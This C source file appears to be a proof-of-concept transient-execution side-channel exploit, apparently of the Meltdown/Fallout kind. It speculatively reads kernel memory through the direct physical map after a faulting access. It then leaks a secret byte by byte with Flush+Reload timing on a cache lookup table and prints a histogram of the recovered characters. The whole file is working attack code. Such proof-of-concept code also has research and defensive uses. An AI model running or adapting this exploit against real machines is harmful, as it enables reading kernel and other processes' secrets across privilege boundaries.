#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#include "cacheutils.h"

#define FROM 'A'
#define TO '_'
#define  SECRET_LEN 8
#define THRESHLOD 1000

char __attribute__((aligned(4096))) mem[256 * 4096];
int hist[64][256];
char secret[SECRET_LEN+1] = {0};

int recover(size_t index);

int main(int argc, char *argv[]) {
  // Initialize and flush LUT
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  // Get a valid page and its direct physical map address (i.e., a kernel mapping to the page)
  char *mapping = (char *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  memset(mapping, 1, 4096);
  size_t paddr = get_physical_address((size_t)mapping);
  if (!paddr) {
    printf("[!] Could not get physical address! Did you start as root?\n");
    exit(1);
  }
  char *target = (char *)(get_direct_physical_map() + paddr);

  printf("[+] Kernel address: %p\n", target);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);

  // setup signal handler
  signal(SIGSEGV, trycatch_segfault_handler);

  register size_t index = 0;
  while (index < SECRET_LEN) {
    while(1)
    {
      // Ensure the kernel mapping refers to a value not in the cache
      flush(mapping);

      // Dereference the kernel address and encode in LUT
      // Not in cache -> reads load buffer entry
      if (!setjmp(trycatch_buf))
      {
        maccess(0);
        maccess(mem + 4096 * target[index]);
      }
      if(recover(index))
        break;
    }
    ++index;
  }
  return 0;
}

int recover(size_t index)
{
  // Recover value from cache and update histogram
  int update = 0;
  for (size_t i = FROM; i <= TO; i++) {
    if (flush_reload((char *)mem + 4096 * i + index)) {
      hist[index][i]++;
      update = 1;
    }
  }

  // If new hit, display histogram
  if (update) {
    printf("\x1b[2J");
    printf("index: %lu\n", index);
    int max = 1;
    int max_index = -1;
    for (int i = FROM; i <= TO; i++) {
      if (hist[index][i] > max)
      {
        max = hist[index][i];
        max_index = i;
      }
    }
    for (int i = FROM; i <= TO; i++) {
      printf("%c: (%4d) ", i, hist[index][i]);
      for (int j = 0; j < hist[index][i] * 60 / max; j++) {
        printf("#");
      }
      printf("\n");
    }
    printf("recovered: %s", secret);
    fflush(stdout);
    // if over selection threshold accept as leaked byte
    if(max > THRESHLOD)
    {
      secret[index] = (char) max_index;
      printf("\rrecovered: %s\n", secret);
      return 1;
    }
    else
    {
      printf("\n");
      return 0;
    }
    
  }
  else
  {
    return 0;
  }
  
}
